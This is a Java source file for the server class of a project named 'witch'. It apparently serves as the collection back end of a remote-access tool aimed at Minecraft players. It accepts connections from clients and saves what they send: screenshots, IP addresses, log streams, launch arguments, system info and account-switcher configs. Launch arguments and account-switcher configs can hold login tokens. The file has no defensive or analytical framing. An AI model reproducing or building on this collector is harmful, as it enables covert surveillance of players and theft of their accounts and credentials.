package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.DisconnectInfo;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.PlayerInfo;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static int clientIndex = 0;
    public final String name;
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    public final SendUtil sendUtil = new SendUtil();
    public boolean stopped = false;

    public Server(int port, String name) throws Exception {
        super(port);
        this.name = name;
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    public void log(String string) {
        System.out.println(LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + ": " + string);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: " + address + " ID: " + clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        clientIndex++;
    }

    @Override
    public void onClose(Connection conn, DisconnectInfo disconnectInfo) {
        log("Client disconnected: ID: " + clientMap.get(conn).index);
        try {
            clientMap.remove(conn);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        String msgType = message.messageID;
        Object msg = message.data;
        Info info = clientMap.get(conn);
        int id = info.index;
        log("* Received message: " + msgType + " From ID " + id);
        Gson GSON = new Gson();
        try {
            switch (msgType) {
                case "screenshot", "screenshot2" -> {
                    File file = new File("data/screenshots", getFileName(msgType + "id", "png", String.valueOf(id), true));
                    FileUtil.write(file, (byte[]) msg);
                }
                case "skin" -> {
                    String playerName = info.playerData.playerName;
                    File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
                    FileUtil.write(file, (byte[]) msg);
                }
                case "logging" -> {
                    File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
                    String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                    FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                }
                case "player" -> info.playerData = (PlayerInfo) msg;
                case "ip" -> info.ip = (String) msg;
                case "iasconfig", "runargs", "systeminfo", "props" -> {
                    String ext = msgType.equals("systeminfo") ? "txt" : "json";
                    File file = new File("data/data", getFileName(msgType, ext, info.playerData.playerName, true));
                    FileUtil.write(file, GSON.toJson(msg));
                }
                case "server_name" -> sendUtil.trySend(conn, msgType, name);
                default -> log("Message: " + msgType + " " + msg);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
